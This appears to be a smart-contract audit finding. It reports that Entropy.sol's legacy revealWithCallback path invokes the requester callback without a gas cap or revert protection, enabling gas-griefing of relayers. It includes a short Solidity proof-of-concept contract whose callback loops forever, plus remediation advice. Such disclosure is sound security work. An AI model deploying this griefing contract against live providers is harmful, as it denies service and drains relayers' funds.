### Title
Malicious Entropy Requester Can Gas-Grief the Relayer via Unbounded Callback in Legacy `revealWithCallback` Path — (`File: target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

When a provider has `defaultGasLimit == 0`, the `revealWithCallback` function in `Entropy.sol` falls into a legacy code path that invokes `_entropyCallback` on the requester contract with **no gas limit and no revert protection**. A malicious requester contract can implement `_entropyCallback` to consume all available gas, causing the relayer/provider's `revealWithCallback` transaction to revert. This can be repeated to DoS the provider's fulfillment service.

---

### Finding Description

`revealWithCallback` contains two execution branches, gated on `req.gasLimit10k != 0`:

**Protected path (gasLimit10k != 0):** Uses `excessivelySafeCall` with an explicit gas cap and catches reverts gracefully, emitting `CallbackFailed` and setting `CALLBACK_FAILED` state.

**Unprotected legacy path (gasLimit10k == 0):** Reached when `providerInfo.defaultGasLimit == 0` (the default for any provider that has not called `setDefaultGasLimit`). In this branch the callback is invoked with no gas limit and no revert protection:

```solidity
// lines 661–681
} else {
    address callAddress = req.requester;
    ...
    clearRequest(provider, sequenceNumber);   // cleared before callback

    uint len;
    assembly { len := extcodesize(callAddress) }
    if (len != 0) {
        IEntropyConsumer(callAddress)._entropyCallback(  // ← no gas limit, no try/catch
            sequenceNumber,
            provider,
            randomNumber
        );
    }
}
```

`gasLimit10k` is set to `0` in `requestHelper` whenever `providerInfo.defaultGasLimit == 0`:

```solidity
// lines 268–271
if (providerInfo.defaultGasLimit == 0) {
    req.gasLimit10k = 0;
}
```

`defaultGasLimit` is zero by default for every provider unless they explicitly call `setDefaultGasLimit`. Any provider that has not opted into the new gas-limit flow is vulnerable.

**Attack path:**
1. Attacker deploys a contract implementing `IEntropyConsumer` whose `entropyCallback` runs an infinite gas-consuming loop.
2. Attacker calls `requestWithCallback` (or `requestV2` with `gasLimit=0`) against a provider with `defaultGasLimit == 0`, paying only the minimum fee.
3. Provider/relayer calls `revealWithCallback` to fulfill the request.
4. The malicious `_entropyCallback` exhausts all gas → the entire transaction reverts (including `clearRequest`), so the request is **not** cleared.
5. Every subsequent fulfillment attempt by the relayer also reverts.
6. The attacker can repeat this with new requests at minimal cost, permanently blocking the provider's fulfillment queue.

---

### Impact Explanation

**High.** The provider/relayer cannot fulfill any request from the malicious contract. Because the request is never cleared (the whole transaction reverts), the relayer is stuck. Repeated attacks with small fees can exhaust the relayer's ETH budget and halt the Entropy service for all users of that provider.

---

### Likelihood Explanation

**Medium.** Any provider that has not explicitly called `setDefaultGasLimit` (i.e., `defaultGasLimit == 0`) is vulnerable. This is the default state. The legacy `requestWithCallback` function is still live and callable by any unprivileged user, making the attacker-controlled entry path trivially reachable.

---

### Recommendation

1. Wrap the legacy callback invocation in a `try/catch` or use `excessivelySafeCall` with a bounded gas limit, mirroring the protected path.
2. Alternatively, require all providers to set a non-zero `defaultGasLimit` before accepting `requestWithCallback` calls, so all requests always go through the protected path.
3. Consider deprecating the legacy path entirely and routing all requests through the `gasLimit10k != 0` flow.

---

### Proof of Concept

```solidity
// Malicious requester contract
contract MaliciousRequester is IEntropyConsumer {
    IEntropy entropy;
    constructor(address _entropy) { entropy = IEntropy(_entropy); }

    function attack(address provider, bytes32 userRandom) external payable {
        // provider must have defaultGasLimit == 0
        entropy.requestWithCallback{value: msg.value}(provider, userRandom);
    }

    function entropyCallback(uint64, address, bytes32) internal override {
        // Consume all gas — reverts the relayer's revealWithCallback tx
        while (true) {}
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}
```

When the provider/relayer calls `revealWithCallback`, execution enters the `else` branch at line 661 of `Entropy.sol`, invokes `_entropyCallback` with no gas cap, the loop exhausts gas, the transaction reverts, and the request remains active. The relayer wastes gas on every retry. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-283)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
        } else {
            // This check does two important things:
            // 1. Providers have a minimum fee set for their defaultGasLimit. If users request less gas than that,
            //    they still pay for the full gas limit. So we may as well give them the full limit here.
            // 2. If a provider has a defaultGasLimit != 0, we need to ensure that all requests have a >0 gas limit
            //    so that we opt-in to the new callback failure state flow.
            req.gasLimit10k = roundTo10kGas(
                callbackGasLimit < providerInfo.defaultGasLimit
                    ? providerInfo.defaultGasLimit
                    : callbackGasLimit
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-576)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L661-681)
```text
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```
